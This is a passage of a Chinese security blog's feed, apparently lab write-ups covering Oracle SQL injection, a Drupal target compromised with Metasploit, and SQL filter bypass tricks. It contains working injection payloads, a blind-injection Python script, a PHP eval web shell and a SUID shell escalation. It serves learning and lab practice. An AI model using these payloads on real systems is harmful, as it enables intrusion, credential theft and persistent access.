&lt;p&gt;信息收集是渗透测试的前期主要工作，是非常重要的环节，收集足够多的信息才能方便接下来的测试，信息收集主要是收集网站的域名信息、子域名信息、目标网站信息、</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>三十二，Oracle中SQL注入</title>
    <link href="http://example.com/2024/01/04/%E4%B8%89%E5%8D%81%E4%BA%8C%EF%BC%8COracle%E4%B8%ADSQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2024/01/04/%E4%B8%89%E5%8D%81%E4%BA%8C%EF%BC%8COracle%E4%B8%ADSQL%E6%B3%A8%E5%85%A5/</id>
    <published>2024-01-04T11:17:06.000Z</published>
    <updated>2024-01-04T11:19:16.689Z</updated>
    
    <content type="html"><![CDATA[<h4><span id="oracle-sql注入">Oracle SQL注入</span></h4><h5><span id="1oracle数据库介绍">1，Oracle数据库介绍：</span></h5><p>Oracle数据库系统是世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小微机环境。它是一种高效率的、可靠性好的、适应高吞吐量的数据库方案。</p><p>Oracle服务默认端口：1521</p><p>Oracle和MySQL数据库语法大致相同，结构不太相同。</p><h5><span id="2oracle和mysql的语法差异">2，Oracle和MySQL的语法差异：</span></h5><ul><li><p>Oracle要求select后必须指明要查询的表名，可以用dual。</p><p>在Oracle中每个库中均存在一张dual表，这个表是虚表，并没有实际的存储意义，它永远只存储一条数据，因为Oracle的SQL语法要求select后必须跟上from，所以我们通常使用dual来作为计算、查询时间等SQL语句中from之后的虚表占位。</p><p>’a‘ 必须要和数据的类型一致，负责报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union selecct &#x27;a&#x27;,&#x27;b&#x27; from dual--+</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040957150.png" alt="image-20240103193001440"></p><ul><li><p>Oracle使用 || 拼接字符串，MySQL中为或运算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union selecct &#x27;a&#x27;||&#x27;a&#x27;,&#x27;b&#x27; from dual--+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040957231.png" alt="image-20240103193315338"></p></li><li><p>单引号和双引号在Oracle中虽然都是字符串，但是双引号可以用来消除关键字，比如sysdate，不能使用保留字作为用户定义的变量，但是当加上双引号就可以。</p></li><li><p>Oracle中没有空字符，’‘和’null’都是null，而MySQL中认为’’仍然是一个字符串。</p></li></ul><h5><span id="3oracle的重点系统表">3，Oracle的重点系统表</span></h5><p>– dba_tables : 系统里所有的表的信息，需要DBA权限才能查询<br>– all_tables : 当前用户有权限的表的信息<br>– user_tables: 当前用户名下的表的信息<br>– DBA_ALL_TABLES：DBA 用户所拥有的或有访问权限的对象和表<br>– ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表<br>– USER_ALL_TABLES：某一用户所拥有的对象和表</p><h5><span id="4oracle常用信息查询方法">4，oracle常用信息查询方法</span></h5><p>1、获取数据库版本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT banner FROM v$version WHERE banner LIKE &#x27;Oracle%25&#x27;;</span><br><span class="line">&#x27;SELECT banner,null FROM v$version WHERE banner LIKE &#x27;Oracle%25&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040957233.png" alt="image-20240103195721601"></p><p>2、获取操作系统版本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT banner FROM v$version WHERE banner LIKE &#x27;TNS%25&#x27;;</span><br><span class="line">&#x27;SELECT banner,null FROM v$version WHERE banner LIKE &#x27;TNS%25&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040958372.png" alt="image-20240103195739315"></p><p>3、获取当前数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM v$database;</span><br><span class="line">/全局数据库名</span><br><span class="line">&#x27; union select (SELECT global_name FROM global_name),null from dual --+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040958026.png" alt="image-20240103201603612"></p><p>4,获取数据库用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT user FROM dual;</span><br><span class="line">获取所有数据库用户</span><br><span class="line">SELECT username FROM all_users;</span><br><span class="line">SELECT name FROM sys.user$; -- 需要高权限</span><br></pre></td></tr></table></figure><p>6,获取当前用户权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM session_privs;</span><br></pre></td></tr></table></figure><p>7,获取当前用户有权限的所有数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT owner, table_name FROM all_tables;</span><br></pre></td></tr></table></figure><p>8,获取表，all_tables类似于MySQL中的information_schema.tables</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT owner, table_name FROM all_tables;</span><br></pre></td></tr></table></figure><p>9,获取字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name FROM all_tab_columns;</span><br></pre></td></tr></table></figure><h5><span id="5通过burp-labs第六关">5,通过burp labs第六关</span></h5><p>1，确定闭合—‘单引号字符型闭合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--</span><br><span class="line">’--</span><br></pre></td></tr></table></figure><p>2，确定返回列数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by 3</span><br><span class="line">order by 2</span><br></pre></td></tr></table></figure><p>3,找出所有表名称–<strong>USERS_AYGHUL</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql：</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=database();</span><br><span class="line">oracle：</span><br><span class="line">SELECT table_name FROM all_tables;</span><br><span class="line">&#x27; union select table_name,null from all_tables--</span><br><span class="line">USERS_OQVBCS</span><br><span class="line">PASSWORD_HRMFUV</span><br><span class="line">USERNAME_PUGXDV</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040958216.png" alt="image-20240103203034892"></p><p>4,找出该表的列名–<strong>USERNAME_UXMKVN</strong>,<strong>PASSWORD_XPUKYX</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql：</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database();</span><br><span class="line">oracl:</span><br><span class="line">SELECT column_name FROM all_tab_columns;</span><br><span class="line">&#x27; union select column_name,null FROM all_tab_columns where table_name=&#x27;USERS_OQVBCS&#x27;--</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040959463.png" alt="image-20240103203403152"></p><p>5,找出用户表中的所有数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql:</span><br><span class="line">select group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from users ;</span><br><span class="line">oracl:</span><br><span class="line">select name,password from users;</span><br><span class="line">&#x27; union select USERNAME_PUGXDV,PASSWORD_HRMFUV from USERS_OQVBCS--</span><br><span class="line">administrator</span><br><span class="line">kxiw0je1gupg2dxe5y1t</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040959877.png" alt="image-20240103203810074"></p><p>6,登录成功</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040959272.png" alt="image-20240103203934349"></p><h5><span id="6报错注入">6，报错注入</span></h5><p>报错注入常用函数：</p><p>1、utl_inaddr.get_host_name</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_inaddr.get_host_name((select user from dual)) from dual;</span><br></pre></td></tr></table></figure><p>11g之后，使用此函数的数据库用户需要有访问网络的权限</p><p>11g之后，使用此函数的数据库用户需要有访问网络的权限</p><p>2、ctxsys.drithsx.sn</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ctxsys.drithsx.sn(1, (select user from dual)) from dual;</span><br></pre></td></tr></table></figure><p>处理文本的函数，参数错误时会报错。</p><p>3、CTXSYS.CTX_REPORT.TOKEN_TYPE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), &#x27;123&#x27;) from dual;</span><br></pre></td></tr></table></figure><p>4、XMLType</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&#x27; and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --+</span><br></pre></td></tr></table></figure><p>注意url编码，如果返回的数据有空格的话，它会自动截断，导致数据不完整，这种情况下先转为 hex，再导出。</p><p>5、dbms_xdb_version.checkin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xdb_version.checkin((select user from dual)) from dual;</span><br></pre></td></tr></table></figure><p>6、dbms_xdb_version.makeversioned</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xdb_version.makeversioned((select user from dual)) from dual;</span><br></pre></td></tr></table></figure><p>7、dbms_xdb_version.uncheckout</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xdb_version.uncheckout((select user from dual)) from dual;</span><br></pre></td></tr></table></figure><p>8、dbms_utility.sqlid_to_sqlhash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual;</span><br></pre></td></tr></table></figure><p>9、ordsys.ord_dicom.getmappingxpath</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual;</span><br></pre></td></tr></table></figure><p>10、UTL_INADDR.get_host_name</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select UTL_INADDR.get_host_name((select user from dual)) from dual;</span><br></pre></td></tr></table></figure><p>11、UTL_INADDR.get_host_address</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select UTL_INADDR.get_host_name(&#x27;~&#x27;||(select user from dual)||&#x27;~&#x27;) from dual;</span><br></pre></td></tr></table></figure><h5><span id="7布尔盲注">7,布尔盲注</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and (SELECT substr(user,1,1)FROM dual) &gt;&#x27;!&#x27;--</span><br><span class="line">’ union select user,null from dual --</span><br></pre></td></tr></table></figure><p>通过decode配合除数为0来进行布尔盲注，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&#x27; and 1=(select decode(substr(user, 1, 1), &#x27;S&#x27;, (1/1),0) from dual) --+</span><br></pre></td></tr></table></figure><h5><span id="8时间盲注">8，时间盲注</span></h5><p>时间延迟函数：DBMS_PIPE.RECEIVE_MESSAGE()函数<br>dbms_pipe.receive_message(‘RDS’, 10) #将为从RDS管道返回的数据等待10秒。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from dual where DBMS_PIPE.RECEIVE_MESSAGE(&#x27;asd&#x27;, REPLACE((SELECT substr(user, 1, 1) FROM dual), &#x27;S&#x27;, 10))=1;</span><br></pre></td></tr></table></figure><p>还可以配合decode：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;RDS&#x27;,10),0) from dual;</span><br></pre></td></tr></table></figure><p>python代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"># 忽略警告：当你的Python程序通过requests发送一个HTTPS请求但没有验证服务器证书时，urllib3会发出InsecureRequestWarning警告。</span><br><span class="line">resu=&#x27;Babbage Web Spray&#x27;</span><br><span class="line">name = &#x27;&#x27;</span><br><span class="line">url1 = &quot;https://0a0f0055049ec60881ee76b500e700ea.web-security-academy.net/filter?category=Pets&#x27;&quot;</span><br><span class="line">proxies = &#123;</span><br><span class="line">        &quot;http&quot;: &quot;http://127.0.0.1:7890&quot;,</span><br><span class="line">        &quot;http&quot;: &quot;https://127.0.0.1:7890&quot;,</span><br><span class="line">        &#125;</span><br><span class="line"># 代理</span><br><span class="line">for j in range(1, 10):</span><br><span class="line">    for i in range(65, 123):</span><br><span class="line">        url=url1+&quot; and (select substr(user,&quot;+str(j)+&quot;,1) from dual)=&#x27;&quot;+chr(i)+&quot;&#x27;--&quot;</span><br><span class="line">        response = requests.get(url=url,proxies=proxies,verify=False)</span><br><span class="line">        # SSL证书验证：服务器的SSL证书可能未被客户端信任。如果你确认可以接受不验证服务器证书的安全风险（仅限开发环境），可以在请求时添加verify=False参数</span><br><span class="line">        con = response.text</span><br><span class="line">        if resu in con:</span><br><span class="line">            name = name+chr(i)</span><br><span class="line">            print(name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040959534.png" alt="image-20240104094702412"></p><h5><span id="9oracle的decode函数">9,oracle的decode函数</span></h5><p><a href="https://blog.csdn.net/weixin_44185837/article/details/106036172?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170428822716800225594404%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170428822716800225594404&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-106036172-null-null.142%5Ev99%5Econtrol&utm_term=oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84decode%E5%87%BD%E6%95%B0&spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_44185837/article/details/106036172?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170428822716800225594404%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170428822716800225594404&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-106036172-null-null.142^v99^control&amp;utm_term=oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84decode%E5%87%BD%E6%95%B0&amp;spm=1018.2226.3001.4187</a></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h4&gt;&lt;span id=&quot;oracle-sql注入&quot;&gt;Oracle SQL注入&lt;/span&gt;&lt;/h4&gt;&lt;h5&gt;&lt;span id=&quot;1oracle数据库介绍&quot;&gt;1，Oracle数据库介绍：&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;Oracle数据库系统是世界上流行的关系数据库管理系统，系统可</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>三十一，通过IP获得服务器权限</title>
    <link href="http://example.com/2024/01/01/%E4%B8%89%E5%8D%81%E4%B8%80%EF%BC%8C%E9%80%9A%E8%BF%87IP%E8%8E%B7%E5%BE%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90/"/>
    <id>http://example.com/2024/01/01/%E4%B8%89%E5%8D%81%E4%B8%80%EF%BC%8C%E9%80%9A%E8%BF%87IP%E8%8E%B7%E5%BE%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90/</id>
    <published>2024-01-01T08:28:46.000Z</published>
    <updated>2024-01-01T10:18:10.683Z</updated>
    
    <content type="html"><![CDATA[<h4><span id="1获得ip地址">1，获得IP地址</span></h4><p>靶机与Kali在同一VMware中，可先查看靶机的MAC地址，可点击设置—&gt;网络适配器—&gt;高级，找到MAC地址为:00:0C:29:60:07:93</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011635539.png" alt="image-20240101163424971" style="zoom:80%;"><p>先查看当前Kali的IP为：192.168.2.100</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011642206.png" alt="image-20240101164133597" style="zoom:80%;"><p>在Kali中ping</p><p>该网段中的所有存在的地址，并对比MAC地址，找到靶机的IP为：192.168.2.119</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.2.100/24</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011700091.png" alt="image-20240101170049669" style="zoom:80%;"><h4><span id="2扫描靶机的ip有哪些开放的端口">2，扫描靶机的IP有哪些开放的端口</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map -p1-500 -v 192.168.2.119</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011814075.png" alt="image-20240101170542451" style="zoom:80%;"><p>通过上图可以看到，靶机开放了22，80，111三个端口，其中80端口时http服务端口，用浏览器打开看看</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011710382.png" alt="image-20240101170756980"></p><p>尝试用admin-admin&#x2F;admin123等弱密码登录，无法成功</p><h4><span id="3目录扫描寻找有关漏洞信息的文件">3，目录扫描，寻找有关漏洞信息的文件</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.2.119&quot; -x 403,404 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011722855.png" alt="image-20240101172225232"></p><p>将以上文件在浏览器中打开看看</p><p>在<a href="http://192.168.2.119/UPGRADE.txt%E4%B8%AD%E5%8F%91%E7%8E%B0">http://192.168.2.119/UPGRADE.txt中发现</a></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011724642.png" alt="image-20240101172428761"></p><p>发现该网站是用Drupal技术搭建的，且版本为7.10之前</p><p>去官网查看版本，发现这是2015年的版本了，说明其可能存在漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011728657.png" alt="image-20240101172813357"></p><h4><span id="4用msfconsole获得shell">4，用msfconsole获得shell</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole打开msfconsole</span><br><span class="line">search drupal查看drupal有哪些漏洞</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011731742.png" alt="image-20240101173155499"></p><p>在以上漏洞中，我们选择2016年及其之后的使用</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011737423.png" alt="image-20240101173717721"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011739915.png" alt="image-20240101173837046"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011741041.png" alt="image-20240101174143572"></p><h4><span id="5权限维持">5,权限维持</span></h4><p>在Kali中创建1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>kala进入桌面的文件夹下后开启简易的web服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m thhp.server 8081</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011813799.png" alt="image-20240101175234817"></p><p>在拿到的shell中下载该1.php文件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011805724.png" alt="image-20240101180545308"></p><h4><span id="6提升权限">6,提升权限</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -name cron.php -exec &quot;/bin/sh&quot; \; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011813613.png" alt="image-20240101180855301"></p><h4><span id="7结果">7，结果</span></h4><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011812296.png" alt="image-20240101181246805"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h4&gt;&lt;span id=&quot;1获得ip地址&quot;&gt;1，获得IP地址&lt;/span&gt;&lt;/h4&gt;&lt;p&gt;靶机与Kali在同一VMware中，可先查看靶机的MAC地址，可点击设置—&amp;gt;网络适配器—&amp;gt;高级，找到MAC地址为:00:0C:29:60:07:93&lt;/p&gt;
&lt;img src=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>三十，SQL注入绕过</title>
    <link href="http://example.com/2023/12/28/%E4%B8%89%E5%8D%81%EF%BC%8CSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2023/12/28/%E4%B8%89%E5%8D%81%EF%BC%8CSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</id>
    <published>2023-12-28T11:41:08.000Z</published>
    <updated>2023-12-28T13:56:26.045Z</updated>
    
    <content type="html"><![CDATA[<p><strong>目录：</strong></p><p>&emsp;<strong>&emsp;1，绕过空格 (注释符&#x2F;* *&#x2F;，%a0)</strong><br>        <strong>&emsp;&emsp;2，引号绕过(使用十六进制)</strong><br>        <strong>&emsp;&emsp;3，逗号绕过(使用from或者offset)</strong><br>        <strong>&emsp;&emsp;4，or and xor not绕过</strong><br>        <strong>&emsp;&emsp;5，绕过注释符号 (#，–(后面跟一个空格) ) 过滤</strong><br>        <strong>&emsp;&emsp;6，绕过union，select，where等</strong><br>        <strong>&emsp;&emsp;7，宽字节注入</strong><br>        <strong>&emsp;&emsp;8，多参数请求拆分</strong><br>        <strong>&emsp;&emsp;9，HTTP参数污染</strong><br>        <strong>&emsp;&emsp;10，编写使用tamper</strong><br>        <strong>&emsp;&emsp;11，堆叠注入</strong><br>        &emsp;&emsp;<strong>12，绕过waf</strong></p><p>在做sqli关卡时，会遇到各种各样的限制，如禁止使用and,or,#注释等等，对此若想继续进行SQL注入，则需使用以下方法来绕过这些限制。</p><h4><span id="1绕过空格注释符x2f-x2fa0">1，绕过空格（注释符&#x2F;* *&#x2F;，%a0）</span></h4><p>两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/ （）</span><br></pre></td></tr></table></figure><p>最基本的绕过方法，用注释替换空格：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* 注释 */</span><br><span class="line"></span><br><span class="line">/**/表示注释</span><br><span class="line">/*!*/表示在!后还能加入sql语句并执行，只能执行sql版本号支持的sql语句</span><br></pre></td></tr></table></figure><p>例如27a关禁用空格，用%0a来代替，布尔盲注代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paramsGet = url+ <span class="string">&#x27;%0aand%0aascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%0a and&quot;1&quot;=&quot;1&#x27;</span>.<span class="built_in">format</span>(i,tmp)</span><br></pre></td></tr></table></figure><p>26a用（）来代替空格，布尔盲注代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paramsGet = url+ <span class="string">&quot;anandd(ascii(substr((select (group_concat(table_name) ) from (infoorrmation_schema.tables) where (table_schema=database())),&#123;0&#125;,1))&gt;&#123;1&#125;)anandd&#x27;1&#x27;=&#x27;1&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br></pre></td></tr></table></figure><h4><span id="2引号绕过使用十六进制">2，引号绕过（使用十六进制）</span></h4><p>若禁用了双引号“，但我们在以下查询指定表的字段时需要用的双引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name)  from information_schema.columns where table_name=&quot;users&quot; and table_schema=database();</span><br></pre></td></tr></table></figure><p>遇到这样的问题就要使用十六进制来处理这个问题了。users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name)  from information_schema.columns where table_name=0x7573657273 and table_schema=database();</span><br></pre></td></tr></table></figure><h4><span id="3逗号绕过使用from或者offset">3，逗号绕过（使用from或者offset）</span></h4><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure><p>使用join：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2     #等价于</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure><p>使用like：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80   #等价于</span><br><span class="line">select user() like &#x27;r%&#x27;</span><br></pre></td></tr></table></figure><p>对于limit可以使用offset来绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news limit 0,1    #等价于</span><br><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure><h4><span id="4or-and-xor-not绕过">4，or and xor not绕过</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 